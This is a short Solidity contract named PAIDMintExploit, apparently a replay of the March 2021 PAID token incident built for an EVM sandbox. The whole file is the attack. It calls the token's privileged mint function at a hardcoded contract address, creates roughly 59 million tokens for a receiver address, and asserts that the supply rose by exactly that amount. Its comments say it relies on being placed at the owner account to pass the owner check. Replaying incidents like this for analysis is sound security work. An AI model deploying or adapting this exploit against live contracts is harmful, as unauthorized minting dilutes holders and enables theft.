// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Clean synthetic for EVM Playground (2021-03-PAID).
// Etched at owner EOA so onlyOwner (hardcoded in impl) passes on mint.

interface IPaid {
    function mint(address _owner, uint256 _amount) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract PAIDMintExploit {
    IPaid constant PAID = IPaid(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df);
    address constant RECEIVER = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
    uint256 constant MINT_AMOUNT = 59_471_745_571_000_000_000_000_000;

    function run() external {
        uint256 supplyBefore = PAID.totalSupply();
        PAID.mint(RECEIVER, MINT_AMOUNT);
        uint256 minted = PAID.balanceOf(RECEIVER);
        uint256 supplyAfter = PAID.totalSupply();
        assert(minted == MINT_AMOUNT);
        assert(supplyAfter - supplyBefore == MINT_AMOUNT);
    }
}
